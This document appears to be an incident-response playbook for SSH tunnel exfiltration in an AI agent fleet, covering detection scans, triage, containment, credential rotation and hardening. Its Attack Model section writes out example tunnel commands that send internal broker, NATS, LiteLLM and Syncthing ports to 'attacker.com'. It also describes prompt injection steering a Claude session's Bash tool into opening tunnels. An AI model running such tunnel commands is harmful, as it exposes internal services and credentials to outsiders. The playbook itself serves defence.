# Playbook: SSH Tunnel Data Exfiltration

**System:** Sontara Lattice (claude-peers) fleet
**Last updated:** 2026-03-28
**Audience:** the operator (fleet operator)
**Severity tier:** Tier 3 (Approval Required) -- exposes internal services to the internet

---

## Table of Contents

1. [Attack Model](#attack-model)
2. [What Gets Exposed](#what-gets-exposed)
3. [Detection Signals](#detection-signals)
4. [Immediate Triage (0-5 minutes)](#immediate-triage)
5. [Investigation](#investigation)
6. [Containment](#containment)
7. [Recovery](#recovery)
8. [Decision Tree](#decision-tree)
9. [Monitoring Gaps](#monitoring-gaps)
10. [Hardening Recommendations](#hardening-recommendations)

---

## Attack Model

Every fleet machine has SSH access to every other fleet machine via Tailscale. Daemons have full bash and SSH access. A compromised session or daemon can establish SSH tunnels that expose internal fleet services to the internet or tunnel data outbound.

### Tunnel Types and Their Danger

**Remote Forward (`ssh -R`) -- Expose internal service to attacker:**
```bash
# Expose the broker to the internet via attacker's server
ssh -R 8080:<broker-ip>:7899 attacker.com
# Now attacker.com:8080 reaches the broker -- full API access

# Expose NATS to the internet
ssh -R 4222:<broker-ip>:4222 attacker.com
# Now attacker.com:4222 has access to NATS JetStream

# Expose Syncthing GUI
ssh -R 8384:localhost:8384 attacker.com
# Now attacker.com:8384 can manage Syncthing -- add devices, folders

# Expose LiteLLM proxy
ssh -R 4000:<broker-ip>:4000 attacker.com
# Now attacker.com:4000 can use the LLM proxy -- consume API credits, read model config
```

**Local Forward (`ssh -L`) -- Tunnel data outbound through attacker:**
```bash
# Tunnel NATS through attacker's server (NATS client thinks it's connecting locally)
ssh -L 4222:attacker-nats:4222 attacker.com
# Local processes connecting to localhost:4222 now go through attacker

# Create SOCKS proxy through attacker
ssh -D 1080 attacker.com
# Route any traffic through the attacker's network
```

**Dynamic Forward (`ssh -D`) -- Full SOCKS proxy:**
```bash
ssh -D 9050 attacker.com
# Any process configured to use SOCKS5 on localhost:9050 tunnels through attacker
```

### Attack Vectors

1. **Compromised daemon with bash access.** Daemons run `exec.Command` for SSH operations. A poisoned daemon prompt could include tunnel setup commands.
2. **Compromised Claude session.** Claude Code has the Bash tool. A prompt injection could instruct it to establish a tunnel.
3. **Persistence via systemd or cron.** Attacker installs an autossh service that maintains persistent tunnels across reboots.
4. **SSH config modification.** Add tunnel directives to `~/.ssh/config` so tunnels are established automatically on SSH connections.

### Fleet Services At Risk

| Service | Host | Port | Risk if Exposed |
|---------|------|------|----------------|
| Trust Broker | <broker-ip> | 7899 | Full fleet API: register peers, send messages, read events, write fleet memory |
| NATS JetStream | <broker-ip> | 4222 | Subscribe to all security events, inject fake events, read fleet state |
| LiteLLM Proxy | <broker-ip> | 4000 | Use LLM API credits, read model config, intercept prompts |
| Syncthing GUI | localhost | 8384 | Add devices, share folders, exfiltrate synced data |
| Wazuh Manager | <broker-ip> | 1514/1515 | Disable agent reporting, modify rules, suppress alerts |
| SSH | All machines | 22 | Lateral movement to any fleet machine |
| Gridwatch Dashboard | <broker-ip> | 8888 | Fleet health reconnaissance |

---

## Detection Signals

### Primary: Unexpected SSH Connections

```bash
# Check for SSH connections to non-fleet IPs on all machines
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "=== $machine ==="
  if [ "$machine" = "workstation" ]; then
    ss -tnp 2>/dev/null | grep ssh | grep -v '100\.\|127\.\|::1'
  else
    ssh -o ConnectTimeout=5 $machine "ss -tnp 2>/dev/null | grep ssh | grep -v '100\.\|127\.\|::1'" 2>/dev/null
  fi
done
```

### Secondary: SSH Port Forwards Active

```bash
# Check for SSH processes with tunnel flags
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "=== $machine ==="
  if [ "$machine" = "workstation" ]; then
    ps auxf 2>/dev/null | grep -E 'ssh.*-[RLD]' | grep -v grep
  else
    ssh -o ConnectTimeout=5 $machine "ps auxf 2>/dev/null | grep -E 'ssh.*-[RLD]' | grep -v grep" 2>/dev/null
  fi
done
```

### Tertiary: Unusual Listening Ports

```bash
# Check for new listening ports that might be tunnel endpoints
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "=== $machine ==="
  if [ "$machine" = "workstation" ]; then
    ss -tlnp 2>/dev/null | grep -v -E ':(22|7899|4222|4000|8384|8888|1514|1515|53) '
  else
    ssh -o ConnectTimeout=5 $machine "ss -tlnp 2>/dev/null | grep -v -E ':(22|7899|4222|4000|8384|8888|1514|1515|53) '" 2>/dev/null
  fi
done
```

### Quaternary: Autossh or Persistent Tunnel Services

```bash
# Check for autossh processes
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "=== $machine ==="
  if [ "$machine" = "workstation" ]; then
    pgrep -fa autossh 2>/dev/null
    systemctl --user list-units --type=service 2>/dev/null | grep -iE 'tunnel|ssh|autossh'
  else
    ssh -o ConnectTimeout=5 $machine "pgrep -fa autossh 2>/dev/null; systemctl --user list-units --type=service 2>/dev/null | grep -iE 'tunnel|ssh|autossh'" 2>/dev/null
  fi
done
```

---

## Immediate Triage (0-5 minutes)

### Step 1: Identify all active SSH tunnels fleet-wide

```bash
# Comprehensive tunnel scan
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "=== $machine ==="
  if [ "$machine" = "workstation" ]; then
    echo "SSH connections:"
    ss -tnp 2>/dev/null | grep ssh
    echo "SSH processes with forwarding:"
    ps aux 2>/dev/null | grep -E 'ssh.*(-R|-L|-D|tunnel)' | grep -v grep
    echo "Listening ports from SSH:"
    ss -tlnp 2>/dev/null | grep ssh
  else
    ssh -o ConnectTimeout=5 $machine "
      echo 'SSH connections:'
      ss -tnp 2>/dev/null | grep ssh
      echo 'SSH processes with forwarding:'
      ps aux 2>/dev/null | grep -E 'ssh.*(-R|-L|-D|tunnel)' | grep -v grep
      echo 'Listening ports from SSH:'
      ss -tlnp 2>/dev/null | grep ssh
    " 2>/dev/null
  fi
  echo ""
done
```

### Step 2: Kill suspicious SSH tunnel processes immediately

```bash
# On the affected machine:
# Kill specific SSH tunnel process by PID
ssh <machine> "kill <tunnel-pid>"

# Or kill all SSH connections to non-fleet IPs (aggressive)
ssh <machine> "
for pid in \$(ps aux | grep 'ssh.*-[RLD]' | grep -v grep | grep -v '100\.' | awk '{print \$2}'); do
  echo \"Killing PID \$pid\"
  kill \$pid
done
"
```

### Step 3: Check if broker or NATS are being tunneled right now

```bash
# On broker-server: check who is connected to broker port
ssh broker-server "ss -tnp | grep ':7899' | grep -v '100\.\|127\.\|::1'"

# Check NATS connections
ssh broker-server "ss -tnp | grep ':4222' | grep -v '100\.\|127\.\|::1'"

# Check LiteLLM connections
ssh broker-server "ss -tnp | grep ':4000' | grep -v '100\.\|127\.\|::1'"
```

---

## Investigation

### Determine what service was exposed

```bash
# Parse the SSH command to understand the tunnel
# Example: ssh -R 8080:<broker-ip>:7899 attacker.com
# This means: attacker.com:8080 -> <broker-ip>:7899 (broker)

# Check SSH auth log for outbound connections
ssh <machine> "journalctl -u sshd --since '24 hours ago' --no-pager 2>/dev/null | grep -i 'session opened\|accepted\|forwarding' | tail -20"

# Check bash history for tunnel commands
ssh <machine> "grep -E 'ssh.*(-R|-L|-D)' ~/.bash_history ~/.zsh_history 2>/dev/null"
```

### Determine the attacker's endpoint

```bash
# From the SSH process command line, extract the remote host
ssh <machine> "ps aux | grep 'ssh.*-[RLD]' | grep -v grep" | awk '{for(i=1;i<=NF;i++) print $i}' | grep -E '@|\.com|\.net|\.org|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'

# DNS lookup on the attacker's host
dig +short <attacker-hostname>
whois <attacker-ip>
```

### Determine the exposure window

```bash
# When was the tunnel established?
ssh <machine> "ps -o pid,lstart,cmd -p <tunnel-pid> 2>/dev/null"

# Check SSH logs for the outbound connection start time
ssh <machine> "journalctl --since '48 hours ago' --no-pager 2>/dev/null | grep 'ssh.*attacker' | head -5"
```

### Check for persistence mechanisms

```bash
# Check for autossh in crontab
ssh <machine> "crontab -l 2>/dev/null | grep -iE 'ssh|tunnel|autossh'"

# Check for tunnel systemd services
ssh <machine> "find ~/.config/systemd/user/ /etc/systemd/system/ -name '*.service' 2>/dev/null -exec grep -l 'ssh\|tunnel\|autossh' {} +"

# Check SSH config for automatic tunnel setup
ssh <machine> "grep -A5 -iE 'RemoteForward|LocalForward|DynamicForward' ~/.ssh/config 2>/dev/null"

# Check for autossh installed
ssh <machine> "which autossh 2>/dev/null; dpkg -l autossh 2>/dev/null; pacman -Q autossh 2>/dev/null"
```

---

## Containment

### Step 1: Kill all unauthorized tunnels

```bash
# Kill by PID
ssh <machine> "kill <tunnel-pid>"

# If PID is unknown, kill all SSH sessions to the attacker's IP
ssh <machine> "pkill -f 'ssh.*attacker-hostname'"
```

### Step 2: Block outbound SSH to the attacker's IP

```bash
# Block on the source machine
ssh <machine> "sudo iptables -A OUTPUT -d <attacker-ip> -j DROP"

# Block on all fleet machines (belt and suspenders)
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "Blocking $machine..."
  if [ "$machine" = "workstation" ]; then
    sudo iptables -A OUTPUT -d <attacker-ip> -j DROP 2>/dev/null
  else
    ssh -o ConnectTimeout=5 $machine "sudo iptables -A OUTPUT -d <attacker-ip> -j DROP" 2>/dev/null
  fi
done
```

### Step 3: Remove persistence

```bash
# Remove any autossh cron entries
ssh <machine> "crontab -l 2>/dev/null | grep -v 'ssh\|tunnel\|autossh' | crontab -"

# Remove any tunnel systemd services
ssh <machine> "
for unit in \$(systemctl --user list-units --type=service | grep -iE 'tunnel|autossh' | awk '{print \$1}'); do
  systemctl --user stop \$unit
  systemctl --user disable \$unit
done
"

# Remove SSH config tunnel directives
# Manual review required -- do not blindly delete SSH config
ssh <machine> "cat ~/.ssh/config"
```

### Step 4: If broker was exposed, assess API access

```bash
# Check broker logs for requests from non-fleet IPs
ssh broker-server "journalctl -u claude-peers-broker --since '24 hours ago' --no-pager 2>/dev/null | grep -v '100\.\|127\.\|::1' | tail -20"

# Check for unauthorized peer registrations
curl -s -H "Authorization: Bearer $(cat ~/.config/claude-peers/token.jwt)" \
  -d '{"scope":"all"}' -H "Content-Type: application/json" \
  http://<broker-ip>:7899/list-peers | python3 -c "
import json, sys
KNOWN = {'workstation', 'broker-server', 'edge-node', 'workstation-2', 'laptop-1', 'iot-device', 'laptop-2'}
for p in json.load(sys.stdin):
    if p.get('machine','') not in KNOWN:
        print(f'UNKNOWN PEER: {p}')
"
```

---

## Recovery

### Step 1: Assess what the attacker could access through the tunnel

| Exposed Service | Assessment |
|----------------|------------|
| Broker (7899) | Attacker could: register peers, send/read messages, read events, read/write fleet memory. Rotate all UCAN tokens. |
| NATS (4222) | Attacker could: subscribe to security events, inject fake events, read fleet state. Rotate NATS token. |
| LiteLLM (4000) | Attacker could: send LLM requests (cost), read model config. Rotate LLM API keys. |
| Syncthing (8384) | Attacker could: add devices, share folders, exfiltrate data. See SYNCTHING_EXFIL playbook. |
| SSH (22) | Attacker could: access any machine they had keys for. Rotate SSH keys fleet-wide. |

### Step 2: Rotate credentials based on exposure

See the relevant playbook for each exposed service:
- Broker exposed: CREDENTIAL_THEFT playbook
- NATS exposed: Rotate NATS token in config.json on all machines
- LiteLLM exposed: Rotate API keys in LiteLLM config
- Syncthing exposed: SYNCTHING_EXFIL playbook

### Step 3: Verify no tunnels remain

```bash
# Final sweep across all machines
for machine in workstation broker-server edge-node workstation-2 laptop-1 iot-device laptop-2; do
  echo "=== $machine ==="
  if [ "$machine" = "workstation" ]; then
    echo "Tunnels:"; ps aux 2>/dev/null | grep -E 'ssh.*-[RLD]' | grep -v grep || echo "  none"
    echo "Non-fleet SSH:"; ss -tnp 2>/dev/null | grep ssh | grep -v '100\.\|127\.' || echo "  none"
  else
    ssh -o ConnectTimeout=5 $machine "
      echo 'Tunnels:'; ps aux 2>/dev/null | grep -E 'ssh.*-[RLD]' | grep -v grep || echo '  none'
      echo 'Non-fleet SSH:'; ss -tnp 2>/dev/null | grep ssh | grep -v '100\.\|127\.' || echo '  none'
    " 2>/dev/null
  fi
done
```

---

## Decision Tree

```
SSH tunnel exfiltration suspected
|
+-- How was it detected?
|   +-- Unusual outbound connection to non-Tailscale IP
|   +-- New listening port on a fleet machine
|   +-- Broker/NATS accessed from unexpected IP (broker logs)
|   +-- Wazuh alert for SSH config modification (rule 100102)
|
+-- Is the tunnel still active?
|   +-- YES: kill immediately
|   |   +-- Identify the process: ps aux | grep ssh.*-[RLD]
|   |   +-- Kill the PID
|   |   +-- Block the attacker's IP on all machines
|   |
|   +-- NO: tunnel was dropped or terminated
|       +-- Check bash history for tunnel commands
|       +-- Check for persistence (cron, systemd, SSH config)
|
+-- What was exposed through the tunnel?
|   +-- Remote forward (-R): internal service exposed to attacker
|   |   +-- Which service? (broker, NATS, LiteLLM, Syncthing, SSH)
|   |   +-- How long was it exposed? (process start time)
|   |   +-- Rotate credentials for the exposed service
|   |
|   +-- Local forward (-L): traffic tunneled through attacker
|   |   +-- Which service was redirected?
|   |   +-- Was the attacker intercepting traffic (MITM)?
|   |
|   +-- Dynamic forward (-D): full SOCKS proxy
|       +-- All outbound traffic from the machine may have been visible to attacker
|       +-- Full credential rotation required
|
+-- How was the tunnel established?
    +-- Compromised Claude session (prompt injection)?
    +-- Compromised daemon (bash access)?
    +-- Direct SSH access by attacker?
    +-- Persistence mechanism (cron, systemd, SSH config)?
```

---

## Monitoring Gaps

| Gap | Severity | Status | Remediation |
|-----|----------|--------|-------------|
| **No outbound SSH connection monitoring** | **CRITICAL** | NOT IMPLEMENTED | Alert on SSH connections to IPs outside the Tailscale range (100.x.x.x) |
| **No SSH port forward detection** | **HIGH** | NOT IMPLEMENTED | Monitor for `ssh -R`, `ssh -L`, `ssh -D` processes |
| **No broker access logging by source IP** | **HIGH** | NOT IMPLEMENTED | Broker should log source IP for every request, alert on non-Tailscale IPs |
| **No NATS connection source monitoring** | **HIGH** | NOT IMPLEMENTED | NATS should log client connection IPs |
| **Wazuh port monitoring is basic** | **MEDIUM** | PARTIAL | Wazuh checks for new listening ports but does not correlate with SSH tunnel processes |

---

## Hardening Recommendations

1. **Restrict outbound SSH.** On each fleet machine, use iptables to allow outbound SSH only to Tailscale IPs:
   ```bash
   # Allow SSH to Tailscale network
   sudo iptables -A OUTPUT -p tcp --dport 22 -d 100.64.0.0/10 -j ACCEPT
   # Allow SSH to localhost
   sudo iptables -A OUTPUT -p tcp --dport 22 -d 127.0.0.1 -j ACCEPT
   # Drop all other outbound SSH
   sudo iptables -A OUTPUT -p tcp --dport 22 -j DROP
   ```

2. **Disable SSH port forwarding server-side.** On each fleet machine, add to `/etc/ssh/sshd_config`:
   ```
   AllowTcpForwarding no
   GatewayPorts no
   ```
   This prevents the machine from being used as a tunnel endpoint. Only enable on machines that explicitly need forwarding.

3. **Monitor outbound connections with Wazuh.** Add a custom rule that fires when SSH connections are established to non-Tailscale IPs. Use `ss` or `netstat` output as the data source.

4. **Broker source IP logging and filtering.** The broker should:
   - Log the remote IP of every HTTP request
   - Reject requests from IPs outside the Tailscale range (100.64.0.0/10 and 127.0.0.1)
   - Publish a security alert when a non-Tailscale IP attempts to access the API

5. **Periodic tunnel audit.** Create a daemon or cron job that runs every 5 minutes:
   ```bash
   ps aux | grep -E 'ssh.*-[RLD]' | grep -v grep
   ss -tnp | grep ssh | grep -v '100\.\|127\.'
   ```
   If either produces output, publish a security alert to NATS.
